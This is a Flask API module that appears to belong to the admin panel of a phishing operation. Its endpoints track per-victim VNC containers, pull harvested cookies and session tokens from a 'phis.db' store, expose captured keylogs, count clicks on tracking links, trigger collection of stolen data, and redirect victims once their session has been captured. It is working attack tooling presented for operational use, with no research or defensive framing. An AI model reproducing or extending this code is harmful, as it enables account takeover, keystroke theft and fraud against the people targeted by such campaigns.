import os
import sqlite3

from flask import Blueprint, jsonify, current_app
from flask_login import login_required

from ..models import db, Campaign, CampaignUser, Keylog, CollectionLog
from .. import docker_manager

api_bp = Blueprint("api", __name__, url_prefix="/api")


@api_bp.route("/campaigns/<int:campaign_id>/status")
@login_required
def campaign_status(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()

    container_statuses = {}
    for u in users:
        container_statuses[u.vnc_container] = docker_manager.get_container_status(u.vnc_container)
        container_statuses[u.mvnc_container] = docker_manager.get_container_status(u.mvnc_container)

    # Count cookies/sessions from phis.db
    output_dir = current_app.config["OUTPUT_DIR"]
    cookie_count, session_count = _count_cookies(output_dir, campaign_id)

    return jsonify({
        "status": campaign.status,
        "containers": container_statuses,
        "cookie_count": cookie_count,
        "session_count": session_count,
        "users": [{
            "user_num": u.user_num,
            "vnc_container": u.vnc_container,
            "mvnc_container": u.mvnc_container,
            "status": u.status,
        } for u in users],
    })


@api_bp.route("/campaigns/<int:campaign_id>/cookies")
@login_required
def campaign_cookies(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    output_dir = current_app.config["OUTPUT_DIR"]
    db_path = os.path.join(output_dir, "phis.db")
    if not os.path.exists(db_path):
        return jsonify({"cookies": []})
    try:
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        
        # Filter cookies by campaign containers
        from ..models import CampaignUser
        campaign_users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()
        if campaign_users:
            # Get all container names for this campaign
            containers = []
            for cu in campaign_users:
                if cu.vnc_container:
                    containers.append(cu.vnc_container)
                if cu.mvnc_container:
                    containers.append(cu.mvnc_container)
            
            if containers:
                placeholders = ','.join(['?' for _ in containers])
                c.execute(f"SELECT * FROM cookies WHERE phis IN ({placeholders}) ORDER BY id DESC LIMIT 200", containers)
            else:
                c.execute("SELECT * FROM cookies ORDER BY id DESC LIMIT 200")
        else:
            c.execute("SELECT * FROM cookies ORDER BY id DESC LIMIT 200")
        
        rows = [dict(r) for r in c.fetchall()]
        conn.close()
        return jsonify({
            "cookies": rows,
            "campaign_browser": campaign.browser,
            "campaign_name": campaign.name
        })
    except Exception:
        return jsonify({"cookies": [], "campaign_browser": campaign.browser, "campaign_name": campaign.name})


@api_bp.route("/campaigns/<int:campaign_id>/keylogs")
@login_required
def campaign_keylogs(campaign_id):
    keylogs = Keylog.query.filter_by(campaign_id=campaign_id).all()
    return jsonify({
        "keylogs": [{
            "user_num": k.user_num,
            "is_mobile": k.is_mobile,
            "content": k.content,
            "updated_at": k.updated_at.isoformat() if k.updated_at else None,
        } for k in keylogs],
    })


@api_bp.route("/campaigns/<int:campaign_id>/users/<int:user_num>/disconnect", methods=["POST"])
@login_required
def disconnect_user(campaign_id, user_num):
    campaign = Campaign.query.get_or_404(campaign_id)
    cu = CampaignUser.query.filter_by(campaign_id=campaign_id, user_num=user_num).first_or_404()

    redirect_target = campaign.target if campaign.redirect else "/"

    # Disconnect desktop
    if cu.vnc_container:
        try:
            # Write IP to disconnect file in rev-proxy container
            docker_manager.disconnect_user_to_file(cu.vnc_container, redirect_target)
        except Exception as e:
            print(f"Error disconnecting desktop user {user_num}: {e}")
    
    # Disconnect mobile
    if cu.mvnc_container:
        try:
            docker_manager.disconnect_user_to_file(cu.mvnc_container, redirect_target)
        except Exception as e:
            print(f"Error disconnecting mobile user {user_num}: {e}")

    cu.status = "disconnected"
    db.session.commit()

    return jsonify({"success": True, "message": f"User {user_num} disconnected"})


@api_bp.route("/campaigns/<int:campaign_id>/links")
@login_required
def campaign_links(campaign_id):
    from ..models import Link
    links = Link.query.filter_by(campaign_id=campaign_id).order_by(Link.user_num).all()
    return jsonify({
        "links": [{
            "id": l.id,
            "user_num": l.user_num,
            "url": l.url,
            "click_count": l.click_count,
        } for l in links]
    })


@api_bp.route("/campaigns/<int:campaign_id>/collect", methods=["POST"])
@login_required
def trigger_collect(campaign_id):
    """Trigger immediate data collection for a campaign."""
    from ..collector import run_collection
    campaign = Campaign.query.get_or_404(campaign_id)
    if campaign.status != "running":
        return jsonify({"error": "Campaign not running"}), 400
    run_collection(campaign_id)
    return jsonify({"success": True, "message": "Collection triggered"})


@api_bp.route("/server-info")
@login_required
def server_info():
    """Return server IP for domain DNS guidance."""
    import subprocess
    try:
        result = subprocess.run(["curl", "-s", "ifconfig.me"], capture_output=True, text=True, timeout=5)
        ip = result.stdout.strip()
    except Exception:
        ip = "unknown"
    return jsonify({"ip": ip})


@api_bp.route("/domains/list")
@login_required
def domains_list():
    """Return all domains for dropdowns."""
    from ..models import Domain
    domains = Domain.query.filter_by(purpose="campaign").all()
    return jsonify({"domains": [{"id": d.id, "name": d.name, "cert_path": d.cert_path, "key_path": d.key_path} for d in domains]})


def _count_cookies(output_dir, campaign_id=None):
    db_path = os.path.join(output_dir, "phis.db")
    if not os.path.exists(db_path):
        return 0, 0
    try:
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        
        if campaign_id:
            # Filter by campaign containers
            from ..models import CampaignUser
            campaign_users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()
            if campaign_users:
                # Get all container names for this campaign
                containers = []
                for cu in campaign_users:
                    if cu.vnc_container:
                        containers.append(cu.vnc_container)
                    if cu.mvnc_container:
                        containers.append(cu.mvnc_container)
                
                if containers:
                    placeholders = ','.join(['?' for _ in containers])
                    c.execute(f"SELECT COUNT(*) FROM cookies WHERE source='cookie' AND phis IN ({placeholders})", containers)
                    cookie_count = c.fetchone()[0]
                    c.execute(f"SELECT COUNT(*) FROM cookies WHERE source='session' AND phis IN ({placeholders})", containers)
                    session_count = c.fetchone()[0]
                else:
                    cookie_count, session_count = 0, 0
            else:
                cookie_count, session_count = 0, 0
        else:
            c.execute("SELECT COUNT(*) FROM cookies WHERE source='cookie'")
            cookie_count = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM cookies WHERE source='session'")
            session_count = c.fetchone()[0]
        
        conn.close()
        return cookie_count, session_count
    except Exception:
        return 0, 0
